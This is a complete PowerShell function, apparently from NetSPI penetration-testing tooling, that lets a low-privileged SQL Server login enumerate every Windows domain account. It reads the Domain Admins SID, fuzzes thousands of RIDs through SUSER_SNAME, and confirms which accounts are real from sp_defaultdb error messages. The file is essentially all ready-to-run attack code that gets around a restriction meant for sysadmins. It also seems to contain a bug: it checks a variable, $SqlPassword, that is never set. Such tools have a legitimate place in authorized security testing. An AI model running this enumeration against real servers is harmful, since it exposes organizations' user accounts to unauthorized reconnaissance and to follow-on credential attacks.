function Get-DomainAccounts
{
    <#
        .SYNOPSIS
        This script can be used to obtain a list of Windows domain accounts associated with the domain of the SQL Server
        as any user with the PUBLIC role.

        .DESCRIPTION
        This module can be used to obtain a list of all Windows domain accounts associated with the domain of the 
        SQL Server using any login. Selecting that information is typically restricted 
        to sysadmins.  However, logins with the PUBLIC role (everyone) can enumerate
        all Windows accounts using the SUSER_SNAME function by fuzzing the principal_id parameter. 
        In the domain user context the principal_id = rid.  So it can be fuzzed by getting the domain sid
        and fuzzing the last few bytes to enumerate domain users. Once accounts have been enumerated they 
        can be verified via sp_defaultdb error ananlysis.  This is important, because not all of the principal
         ids resolve to Windows accounts.  Some resolve to groups etc.

        .EXAMPLE
        Below is an example of how to enumerate windows accounts from a SQL Server using the current Windows user context or "trusted connection".
        PS C:\> Get-DomainAccounts -SQLServerInstance "SQLSERVER1\SQLEXPRESS" 
    
        .EXAMPLE
        Below is an example of how to enumerate windows accounts from a SQL Server using alternative domain credentials.
        PS C:\> Get-DomainAccounts -SQLServerInstance "SQLSERVER1\SQLEXPRESS" -SqlUser domain\user -SqlPass MyPassword!

        .EXAMPLE
        Below is an example of how to enumerate windows accounts from a SQL Server using a SQL Server login".
        PS C:\> Get-DomainAccounts -SQLServerInstance "SQLSERVER1\SQLEXPRESS" -SqlUser MyUser -SqlPass MyPassword!

        .EXAMPLE
        Below is an example of how to enumerate windows accounts from a SQL Server using a SQL Server login".
        PS C:\> Get-DomainAccounts -SQLServerInstance "SQLSERVER1\SQLEXPRESS" -SqlUser MyUser -SqlPass MyPassword! | Export-Csv c:\temp\DomainAccounts.csv -NoTypeInformation

        .EXAMPLE
        Below is an example of how to enumerate windows accounts from a SQL Server using a SQL Server login with non default fuzznum".
        PS C:\> Get-DomainAccounts -SQLServerInstance "SQLSERVER1\SQLEXPRESS" -SqlUser MyUser -SqlPass MyPassword! -FuzzNum 10000
    
        .LINKS
        www.netspi.com
        http://technet.microsoft.com/en-us/library/cc778824%28v=ws.10%29.aspx
        http://msdn.microsoft.com/en-us/library/ms174427.aspx
        
        .NOTES
        Author: Scott Sutherland - 2014, NetSPI
        Version: Get-DomainAccounts v1.0
        Comments: This should work on SQL Server 2005 and Above.

    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Set SQL or Domain Login username.')]
        [string]$SqlUser,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Set SQL or Domain Login password.')]
        [string]$SqlPass,   
        [Parameter(Mandatory = $true,
        HelpMessage = 'Set target SQL Server instance.')]
        [string]$SqlServerInstance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Max SID to fuzz.')]
        [string]$FuzzNum
    )

    #------------------------------------------------
    # Set default values
    #------------------------------------------------
    if(!$FuzzNum)
    {
        [int]$FuzzNum = 10000
    }

    # -----------------------------------------------
    # Connect to the sql server
    # -----------------------------------------------
    # Create fun connection object
    $conn = New-Object  -TypeName System.Data.SqlClient.SqlConnection

    # Check for domain credentials
    if($SqlUser)
    {
        $DomainUserCheck = $SqlUser.Contains('\')
    }

    # Set authentication type and create connection string
    if($SqlUser -and $SqlPassword -and !$DomainUserCheck)
    {
        # SQL login / alternative domain credentials
        $conn.ConnectionString = "Server=$SqlServerInstance;Database=master;User ID=$SqlUser;Password=$SqlPass;"
        [string]$ConnectUser = $SqlUser
    }
    else
    {
        # Create credentials management entry if a domain user is used
        if ($DomainUserCheck -and (Test-Path  ('C:\Windows\System32\cmdkey.exe')))
        {
            Write-Output  -InputObject "[*] Attempting to authenticate to $SqlServerInstance with domain account $SqlUser..."
            $SqlServerInstanceCol = $SqlServerInstance -replace ',', ':'
            $CredManCmd = 'cmdkey /add:'+$SqlServerInstanceCol+' /user:'+$SqlUser+' /pass:'+$SqlPass 
            Write-Verbose  -Message "Command: $CredManCmd"
            $ExecManCmd = Invoke-Expression  -Command $CredManCmd
        }
        else
        {
            Write-Output  -InputObject "[*] Attempting to authenticate to $SqlServerInstance as the current Windows user..."
        }

        # Trusted connection
        $conn.ConnectionString = "Server=$SqlServerInstance;Database=master;Integrated Security=SSPI;"   
        $UserDomain = [Environment]::UserDomainName
        $Username = [Environment]::UserName
        $ConnectUser = "$UserDomain\$Username"
    }

    # Attempt database connection
    try
    {
        $conn.Open()
        $conn.Close()
        Write-Host  -Object '[*] Connected.' -ForegroundColor 'green'
    }
    catch
    {
        $ErrorMessage = $_.Exception.Message
        Write-Host  -Object '[*] Connection failed' -ForegroundColor 'red'
        Write-Host  -Object "[*] Error: $ErrorMessage" -ForegroundColor 'red'

        # Clean up credentials manager entry
        if ($DomainUserCheck)
        {
            $CredManDel = 'cmdkey /delete:'+$SqlServerInstanceCol
            Write-Verbose  -Message "Command: $CredManDel"   
            $ExecManDel = Invoke-Expression  -Command $CredManDel
        }
        Break
    }


    # -----------------------------------------------
    # Enumerate domain of the sql server
    # -----------------------------------------------
    Write-Host  -Object '[*] Enumerating domain...'

    # Open database connection
    $conn.Open()

    # Setup query
    $query = "SELECT DEFAULT_DOMAIN() as mydomain"
    $cmd = New-Object System.Data.SqlClient.SqlCommand($query,$conn)

    # Execute Query
    $results = $cmd.ExecuteReader()

    # Parse query
    $GetSqlServerDomain = New-Object System.Data.DataTable
    $GetSqlServerDomain.Load($results)
    $GetSqlServerDomain | ForEach-Object { $SqlServerDomain = $_.mydomain}

    # Status user
    Write-Host  -Object "[*] Domain found: $SqlServerDomain"

    # Close database connection
    $conn.Close()


    # -----------------------------------------------
    # Enumerate domain sid
    # -----------------------------------------------
    Write-Host  -Object '[*] Enumerating domain SID...'

    # Open database connection
    $conn.Open()

    # Setup query
    $group = "$SqlServerDomain\Domain Admins"
    $query = "select SUSER_SID('$group') as dasid"
    $cmd = New-Object System.Data.SqlClient.SqlCommand($query,$conn)

    # Execute Query
    $results = $cmd.ExecuteReader()

    # Parse query
    $GetDaSid = New-Object System.Data.DataTable
    $GetDaSid.Load($results)
    $GetDaSid | ForEach-Object { [byte[]]$DaSid = $_.dasid}
    $DaSidDirty = [System.BitConverter]::ToString($DaSid)
    $DaSidNoTrunct = $DaSidDirty.Replace("-","")
    $DaSidTrunct = $DaSidNoTrunct.Substring(0,48)

    # Status user 
    Write-Host  -Object "[*] Domain SID found: $DaSidTrunct"
    
    # Close database connection
    $conn.Close()


    # -----------------------------------------------
    # Enumerate windows accounts with SUSER_NAME()
    # -----------------------------------------------
    Write-Host  -Object "[*] Setting up to fuzz $FuzzNum Windows domain accounts." 
    Write-Host  -Object '[*] Enumerating logins...'

    # Open database connection
    $conn.Open()

    # Create table to store results
    $MyQueryResults = New-Object  -TypeName System.Data.DataTable
    $MyQueryResultsClean = New-Object  -TypeName System.Data.DataTable
    $null = $MyQueryResultsClean.Columns.Add('name') 

    # Creat loop to fuzz principal_id number
    $PrincipalID = 0    

    do 
    {
        # incrememt number
        $PrincipalID++

        # Convert to $PrincipalID to hex
        $PrincipalIDHex = '{0:x}' -f $PrincipalID

        # Pad to 8 bytes
        $PrincipalIDPad = $PrincipalIDHex.PadRight(8,'0')

        # Create users rid
        #[byte[]]$Rid = "0x$DaSidTrunct$PrincipalIDPad"  
        $Rid = "0x$DaSidTrunct$PrincipalIDPad"  
        Write-Verbose "TESTING RID: $Rid"

        # Setup query
        $query = "select SUSER_SNAME($Rid) as name"

        # Execute query
        $cmd = New-Object  -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($query, $conn)

        # Parse results
        $results = $cmd.ExecuteReader()
        $MyQueryResults.Load($results)
        $MyQueryResults | select name -Unique -Last 1 | ForEach-Object {$EnumUser = $_.name}

        # Show enumerated windows accounts
        if($EnumUser -like "*\*"){                        
            Write-Output "[*] - $EnumUser"
        }
    }
    while ($PrincipalID -le $FuzzNum-1)    

    # Filter list of sql logins
    $MyQueryResults |
    Select-Object name -Unique |
    Where-Object  -FilterScript {
        $_.name -notlike '*##*'
    } |
    Where-Object  -FilterScript {
        $_.name -notlike ''
    } |
    ForEach-Object  -Process {
        # Get sql login name
        $SqlLoginName = $_.name

        # add cleaned up list to new data table
        $null = $MyQueryResultsClean.Rows.Add($SqlLoginName)
    }

    # Close database connection
    $conn.Close()

    # Display initial login count
    $SqlLoginCount = $MyQueryResultsClean.Rows.Count
    Write-Verbose  -Message "[*] $SqlLoginCount initial logins were found." 


    # ----------------------------------------------------
    # Validate sql login with sp_defaultdb error ananlysis
    # ----------------------------------------------------

    # Status user
    Write-Host  -Object '[*] Verifying the logins...'

    # Open database connection
    $conn.Open()

    # Create table to store results
    $SqlLoginVerified = New-Object  -TypeName System.Data.DataTable
    $null = $SqlLoginVerified.Columns.Add('name') 

    # Check if sql logins are valid 
    #$MyQueryResultsClean | Sort-Object name
    $MyQueryResultsClean |
    Sort-Object  -Property name |
    ForEach-Object  -Process {
        # Get sql login name
        $SqlLoginNameTest = $_.name
    
        # Setup query
        $query = "EXEC sp_defaultdb '$SqlLoginNameTest', 'NOTAREALDATABASE1234ABCD'"

        # Execute query
        $cmd = New-Object  -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($query, $conn)

        try
        {
            $results = $cmd.ExecuteReader()
        }
        catch
        {
            $ErrorMessage = $_.Exception.Message  

            # Check the error message for a signature that means the login is real
            if (($ErrorMessage -like '*NOTAREALDATABASE*') -or ($ErrorMessage -like '*alter the login*'))
            {
                $null = $SqlLoginVerified.Rows.Add($SqlLoginNameTest)
            }                  
        }
    }

    # Close database connection
    $conn.Close()

    # Display verified logins
    $SqlLoginVerifiedCount = $SqlLoginVerified.Rows.Count
    if ($SqlLoginVerifiedCount -ge 1)
    {
        Write-Host  -Object "[*] $SqlLoginVerifiedCount logins verified:" -ForegroundColor 'green'
        $SqlLoginVerified |
        Select-Object name -Unique|
        Sort-Object  -Property name 
    }
    else
    {
        Write-Host  -Object '[*] No verified Windows accounts found.' -ForegroundColor 'red'
    }

    # Clean up credentials manager entry
    if ($DomainUserCheck)
    {
        $CredManDel = 'cmdkey /delete:'+$SqlServerInstanceCol
        Write-Verbose  -Message "Command: $CredManDel"   
        $ExecManDel = Invoke-Expression  -Command $CredManDel
    }
}
